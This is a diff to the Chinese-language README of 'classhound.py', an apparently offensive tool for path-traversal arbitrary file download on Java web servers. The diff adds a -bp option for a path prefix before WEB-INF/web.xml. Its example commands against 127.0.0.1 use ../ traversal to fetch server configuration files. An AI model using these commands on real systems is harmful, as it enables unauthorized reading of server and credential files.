@@ -33,7 +33,11 @@ python classhound.py -u "http://127.0.0.1/download.jsp" -dc "##" --post "path=##
 # 例如当能够使用 http://127.0.0.1/download.jsp?path=../../../WEB-INF/web.xml 下载文件时:
 python classhound.py -u "http://127.0.0.1/download.jsp?path=#1.png#" -tc "../" -cc 3
 
-4. -f --auto
+4. -bp
+# 当跳目录后发现 /WEB-INF/web.xml 前面还要有前缀路径才能下载任意文件时，可用 -bp 参数指定
+# 当网站目录结构是 /opt/tomcat/webapps/cms/WEB-INF/web.xml 时，可视情况修改为 opt/tomcat/webapps/cms/
+
+5. -f --auto
 # 如果想顺带下载些其他已知文件, 可将服务器文件的相对路径一行一个写入文件中, 然后用 -f 参数指定文件
 # 相对路径的文件下载可能需要不一样数量的遍历字符, 可以启用 -a/--auto 参数，程序会尝试不同数量的遍历字符
 # 例如创建文件 download.txt，内如如下:
